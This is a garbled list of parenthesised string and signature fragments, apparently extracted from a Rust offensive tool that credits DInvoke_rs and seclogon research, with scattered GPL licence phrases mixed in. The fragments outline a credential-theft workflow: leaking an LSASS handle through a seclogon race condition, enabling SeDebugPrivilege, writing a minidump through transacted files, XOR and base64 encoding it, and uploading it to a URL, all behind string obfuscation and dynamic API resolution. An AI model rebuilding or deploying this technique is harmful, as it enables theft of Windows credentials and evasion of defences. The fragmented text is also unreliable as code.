"(""  \\ {} handles have been analyzed so far..."", counter"
"("" handles. Starting analysis..."""
"("""", ""decrypt"", ""Decrypt a previously generated dump file."""
"("""", ""dump"", ""Dump lsass."""
"("".\\{}{}"", rand_string, "".log"""
"(""1234abcd"""
"(""CString::new failed"""
"(""Content-Length"", data.len("
"(""Entry point successfully called."""
"(""Error calling LdrGetProcedureAddress"""
"(""Handle to process with id {} closed."", pid"
"(""Handle to process with id {} with PROCESS_DUP_HANDLE access right successfully obtained."", pid"
"(""RtlDispatchAPC is located at the address: 0x{:X}"",*return_address as u64"
"(""The address where NtCreateThread is located at is 0x{:X}."", addr"
"(""The address where RtlDispatchAPC is located at is 0x{:X}."", addr"
"(""The base address of ntdll.dll is 0x{:X}."", ntdll"
"(""The function with ordinal 8 is located at 0x{:X}."", addr"
"(""Usage: {} --dump|--decrypt [options]"", program"
"(""[x] Error opening input file."""
"(""[x] Error: {error}"""
"(""c:\\Windows\\System32\\license.rtf"""
"(""c:\\some\\random\\file.dll"""
"(""c:\\temp\\input.txt"""
"(""c:\\temp\\output.txt"""
"(""c:\\windows\\system32\\kernel32.dll"""
"(""content-type"",cont_type.as_str("
"(""domain"""
"(""f"""
"(""f"", ""force"", ""Force seclogon's service to leak a lsass handle through a race condition."""
"(""h"""
"(""h"", ""help"", ""Print this help menu."""
"(""i"""
"(""i"", ""input"", r""Encrypted dump file [default: c:\temp\input.txt]"", """""
"(""k"""
"(""k"", ""key"", ""Encryption key [default: 1234abcd]"", """""
"(""multipart/form-data; boundary={}"", boundary"
"(""ntdll base address is 0x{:X}"",x.0"
"(""ntdll.dll base address is 0x{:X}."", addr"
"(""ntdll.dll"""
"(""o"""
"(""o"", ""output"", r""Destination path [default: c:\temp\output.txt]"", """""
"(""password"""
"(""u"""
"(""u"", ""upload"", ""Upload URL"", """""
"(""username"""
"(""{} {}."", &lc!(""[+] Memory dump written to file"""
"(""{}"", &lc!(""[+] File uploaded."""
"(""{}"", &lc!(""[+] Handle to lsass leaked."""
"(""{}"", &lc!(""[+] SeDebugPrivilege successfully enabled."""
"(""{}"", &lc!(""[+] Successfully decrypted minidump file."""
"(""{}"", &lc!(""[x] Call to MiniDumpWriteDump failed."""
"(""{}"", &lc!(""[x] Could not retrieve a valid handle. Exiting."""
"(""{}"", &lc!(""[x] Something went wrong."""
"(""{}"", &lc!(""[x] Timeout. Call to NtQueryInformationFile failed."""
"(""{}"", &lc!(""[x] Timeout. Call to NtQueryInformationThread failed."""
"(""{}"", &lc!(""[x] Timeout. Call to NtQuerySystemInformation failed."""
"(""{}"", &lc!(""[x] Transacted file creation failed."""
"(""{}"", &lc!(""[x] Transaction creation failed."""
"(""{}"", opts.usage(&brief"
"(""{}"",&lc!(""[!] Lsass dump created!"""
"(""{}"",&lc!(""[x] Handle leakage failed."""
"(""{}"",&lc!(""[x] SeDebugPrivilege could not be enabled."""
"(""{}"",e"
"(""{}"",lc!(""[x] Invalid arguments. Use -h for detailed help."""
"(""{},{}"", ""------------------------"", rand_boundary"
"(""{}."", &lc!(""[+] Valid handle to lssas found"""
"(""{}{}"", key, ""\0"""
"(""{}{}"", rand_string, "".txt"""
"(""{}{}{}"",&lc!(""[+] Retrieved """
"($a, $b"
"($a:expr, $b:expr, $c:expr"
"($a:expr, $b:expr, $c:expr, $d:expr, $($e:tt"
"(&$a,$b"
"(&PeMetadata, i64, bool"
"(&a.0, a.1, ret"
"(&input, &key, &output"
"(&key, &upload, force"
"(&lc!(""C:\\Windows\\System32\\lsass.exe"""
"(&lc!(""C:\\Windows\\System32\\seclogon.dll"""
"(&lc!(""C:\\Windows\\system32\\lsass.exe"""
"(&lc!(""Dbgcore.dll"""
"(&lc!(""KtmW32.dll"""
"(&lc!(""advapi32.dll"""
"(&lc!(""decrypt"""
"(&lc!(""dump"""
"(&lc!(""kernel32.dll"""
"(&lc!(""lsass.exe"""
"(&lc!(""ntdll.dll"""
"(&pe.0, pe.1"
"(&program, opts"
"() as *const u16, pass.as_ptr("
"() as *const u16,0x80,0x00000001|0x00000002|0x00000004,ptr::null("
"() as *const u16,GENERIC_READ,0,ptr::null("
"() as u32, bytes_ret, over"
"(),false,false,ptr::null("
"(),file.as_ptr("
"(),ptr::null("
"(*const SECURITY_ATTRIBUTES, bool, bool, *const u16"
"(*const u16, *const u16, *const u16, u32, *const u16, *mut u16, u32, *const c_void, *const u16, *const STARTUPINFOW, *mut PROCESS_INFORMATION"
"(*const u16, u32, u32, *const SECURITY_ATTRIBUTES, u32, u32, HANDLE"
"(*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID"
"(*mut SECURITY_ATTRIBUTES, *mut GUID, u32, u32, u32, u32, *mut u16"
"(0x0040, 0, pid"
"(16,ptr,bytes,bytes_ptr"
"(Copy, Clone, Default"
"(Copy, Clone, Default, PartialEq, Debug, Eq"
"(Copy, Clone,Default"
"(HANDLE, *const SECURITY_ATTRIBUTES, u32, u32, u32, *mut u8"
"(HANDLE, *mut IO_STATUS_BLOCK, PVOID, u32, u32"
"(HANDLE, *mut OVERLAPPED, *mut u32, bool"
"(HANDLE, *mut PVOID, *mut usize, u32, *mut u32"
"(HANDLE, *mut PVOID, usize, *mut usize, u32, u32"
"(HANDLE, *mut u32"
"(HANDLE, HANDLE, HANDLE, *mut HANDLE, u32, u32, u32"
"(HANDLE, PVOID, PVOID, usize, *mut usize"
"(HANDLE, u32, *mut u16, *mut u32"
"(HANDLE, u32, PVOID, u32, *mut u32"
"(HANDLE, u32, PVOID, u32, PVOID, u32, *mut u32, *mut OVERLAPPED"
"(HANDLE, u32, u32"
"(HANDLE, u32, u32, u32, usize"
"(HINSTANCE, u32, *mut c_void"
"(PVOID, *mut String, u32, *mut PVOID"
"(a.1, ""LoadLibraryA"", function_ptr, ret, module_name"
"(adv,&lc!(""CreateProcessWithLogonW"""
"(attributes: *mut SECURITY_ATTRIBUTES,uow: *mut GUID, options: u32, isolation_level: u32, isolation_flags: u32, timeout: u32, description: *mut u16"
"(data, ""--{}--\r\n"", boundary"
"(data, ""--{}\r\n"", boundary"
"(data, ""Content-Disposition: form-data; name=\""file\""; filename=\""{}\""\r\n"", rand_string"
"(data, ""Content-Type: text/plain\r\n"""
"(data, ""\r\n"""
"(data, ""{}"", base64::encode(&view_xor"
"(dbg,&lc!(""MiniDumpWriteDump"""
"(desired_access,inherit_handle,process_id"
"(desired_access: u32, inherit_handle: i32, process_id: u32"
"(e.g: target = ""i686-pc-windows-msvc"""
"(file: HANDLE, access: u32, off_high: u32, off_low: u32, bytes: usize"
"(file: HANDLE, attributes: *const SECURITY_ATTRIBUTES, protect: u32, max_size_high: u32, max_size_low: u32, name: *mut u8"
"(file_handle, iosb,ptr,bytes,47"
"(file_path: &str, key: &str, output_file: &str"
"(handle: *mut HANDLE, desired_access: u32, attributes: *mut OBJECT_ATTRIBUTES, client_id: *mut CLIENT_ID"
"(handle: HANDLE, base_address: *mut PVOID, size: *mut usize, new_protection: u32, old_protection: *mut u32"
"(handle: HANDLE, base_address: *mut PVOID, zero_bits: usize, size: *mut usize, allocation_type: u32, protection: u32"
"(handle: HANDLE, base_address: PVOID, buffer: PVOID, size: usize, bytes_written: *mut usize"
"(handle: HANDLE, io: *mut IO_STATUS_BLOCK, file_information: PVOID, length: u32,file_information_class: u32"
"(handle: HANDLE, object_information_class: u32, object_information: PVOID, length: u32, return_length: *mut u32"
"(handle: HANDLE, process_information_class: u32, process_information: PVOID, length: u32, return_length: *mut u32"
"(handle: HANDLE, size: *mut u32"
"(handle: HANDLE, thread_information_class: u32, thread_information: PVOID, length: u32, return_length: *mut u32"
"(hmodule, fun_name, ordinal, return_address"
"(i64,&str,<function_type>,Option<return_type>,[arguments]"
"(k32,&lc!(""CreateEventW"""
"(k32,&lc!(""CreateFileW"""
"(k32,&lc!(""DeviceIoControl"""
"(k32,&lc!(""GetLastError"""
"(k32,&lc!(""GetOverlappedResult"""
"(kernel, window system, and so on"
"(kernel32,&lc!(""CreateFileMappingW"""
"(kernel32,&lc!(""CreateFileTransactedW"""
"(kernel32,&lc!(""GetFileSize"""
"(kernel32,&lc!(""MapViewOfFile"""
"(kernel32,&lc!(""QueryFullProcessImageNameW"""
"(kernel32,&lc!(""SetHandleInformation"""
"(kernel32,&lc!(""UnmapViewOfFile"""
"(key: &str, url: &str, leak: bool"
"(ktmv,&lc!(""CreateTransaction"""
"(ktmv,&lc!(""RollbackTransaction"""
"(lc!(""[x] Error obtaining CloseHandle address."""
"(lc!(""[x] Error obtaining LdrGetProcedureAddress address."""
"(lc!(""[x] Error obtaining LoadLibraryA address."""
"(lc!(""[x] Error obtaining OpenProcess address."""
"(lc!(""[x] Error obtaining kernel32.dll base address."""
"(lc!(""[x] Error obtaining ntdll.dll base address."""
"(lc!(""[x] Failed to call module's entry point (DllMain -> DLL_PROCESS_ATTACH"
"(module, DLL_PROCESS_ATTACH, ptr::null_mut("
"(module_base_address, """", ordinal"
"(module_base_address, &lc!(""CloseHandle"""
"(module_base_address, &lc!(""LdrGetProcedureAddress"""
"(module_base_address, &lc!(""LoadLibraryA"""
"(module_base_address, &lc!(""OpenProcess"""
"(module_base_address,&lc!(""GetLastError"""
"(module_base_address: isize, function: &str"
"(module_base_address: isize, ordinal: u32"
"(module_handle: isize, function_name: &str, ordinal: u32"
"(name: *mut u8, access: u32, mode: u32, attributes: *const SECURITY_ATTRIBUTES, disposition: u32, flags: u32, template: HANDLE, transaction: HANDLE, version: *const u32, extended: PVOID"
"(ntdll, ""NtCreateThread"""
"(ntdll, 8"
"(ntdll,"""", 8"
"(ntdll,&lc!(""NtAllocateVirtualMemory"""
"(ntdll,&lc!(""NtDuplicateObject"""
"(ntdll,&lc!(""NtOpenProcess"""
"(ntdll,&lc!(""NtProtectVirtualMemory"""
"(ntdll,&lc!(""NtQueryInformationFile"""
"(ntdll,&lc!(""NtQueryInformationProcess"""
"(ntdll,&lc!(""NtQueryInformationThread"""
"(ntdll,&lc!(""NtQueryObject"""
"(ntdll,&lc!(""NtQuerySystemInformation"""
"(ntdll,&lc!(""NtWriteVirtualMemory"""
"(ntdll,&lc!(""RtlAdjustPrivilege"""
"(object: HANDLE, mask: u32, flags: u32"
"(pe_info: &PeMetadata, module_base_address: isize"
"(privilege,enable,current_thread,enabled"
"(privilege: u32, enable: u8, current_thread: u8, enabled: *mut u8"
"(process: HANDLE, process_id: u32, file: HANDLE, dump_type: u32, exception: *mut MINIDUMP_EXCEPTION_INFORMATION, stream: *mut MINIDUMP_USER_STREAM_INFORMATION, callback: *mut MINIDUMP_CALLBACK_INFORMATION"
"(process_handle: HANDLE, flags: u32, name: *mut u16, size: *mut u32"
"(program: &str, opts: Options"
"(ptr,""LdrGetProcedureAddress"",function_ptr,ret,hmodule,fun_name,ordinal,return_address"
"(source_phandle: HANDLE, source_handle:HANDLE, target_phandle: HANDLE, target_handle: *mut HANDLE, desired_access: u32, attributes: u32, options: u32"
"(src_ptr, dst_ptr, 1"
"(system_information_class: u32, system_information: PVOID, length: u32, return_length: *mut u32"
"(u32, PVOID, u32, *mut u32"
"(u32, i32, u32"
"(u32, u8, u8, *mut u8"
($c($($e
(&(*shi
(&(*teb
(&Alphanumeric
(&String::default(
(&args[1..]
(&bytes
(&client_id
(&d
(&data
(&f
(&file_content
(&h
(&input_buffer
(&ios
(&l
(&len
(&m
(&mut buffer
(&new_handle
(&o
(&output_buffer
(&output_path
(&overlapped
(&p
(&poti
(&re
(&spoofed_pid
(&u64::default(
(&u8::default(
(&unsued
((
(((module_base_address + functions_rva as isize + (4 * (function_ordinal - ordinal_base
((*shtei
((*tbi
((0
((0x00000009
((144
((module_base_address + 0x3C
((module_base_address + export_rva as isize + 0x10
((module_base_address + export_rva as isize + 0x18
((module_base_address + export_rva as isize + 0x1C
((module_base_address + export_rva as isize + 0x20
((module_base_address + export_rva as isize + 0x24
((module_base_address + names_rva as isize + x as isize * 4
((module_base_address + ordinals_rva as isize + x as isize * 2
()
() == function.to_lowercase(
() == module_name.to_ascii_lowercase(
().add(1
().as_bool(
().as_str(
().collect(
().unwrap(
(*buff as char
(*buffer as char
(*buffer_ptr ^ xor_key
(*dup_handle
(*fpi
(*function_name_ptr as char
(*iosb
(*ret_len
(*shi
(*shtei
(*tbi
(*view_ptr ^ xor_key
(0
(1
(16
(2
(20
(3
(7
(C
(Clone
(DllMain
(GetCurrentThread(
(HANDLE
(PSTR
(PVOID
(_
(a
(addr
(at your option
(b
(base_address: PVOID
(buffer
(buffer.as_ptr(
(char::from
(e
(entry_point
(false
(file_handle
(file_path
(for any work
(function_address
(function_name
(function_ptr
(gratis or for a charge
(handle
(handle: HANDLE
(holder.as_slice(
(https://gist.github.com/smidgedy/1986e52bb33af829383eb858cb38775c
(https://github.com/Kudaes/DInvoke_rs
(https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html
(https://twitter.com/splinter_code
(if any
(if you work as a programmer
(including a cross-claim or counterclaim in a lawsuit
(including a physical distribution medium
(invalid_reference_casting
(key: &str
(m
(map_handle
(module.to_string(
(module: &str
(module_base_address + address as isize
(module_base_address + function_rva as isize
(module_handle
(module_name: &str
(operated by you or a third party
(opt_header as *mut i16
(or copies made from those copies
(output_file
(p_export as *mut i32
(path: &str
(pe_header as isize
(poti_ptr
(ptr
(r
(read
(regardless of how the transaction is characterized
(result
(result.0 as isize
(ret
(return_address
(startup.as_ptr(
(transacted_file_handle
(transaction: HANDLE
(transaction_handle
(true
(url
(using the 3rd argument passed to the macro
(view_xor.as_ptr(
(with or without modification
(x
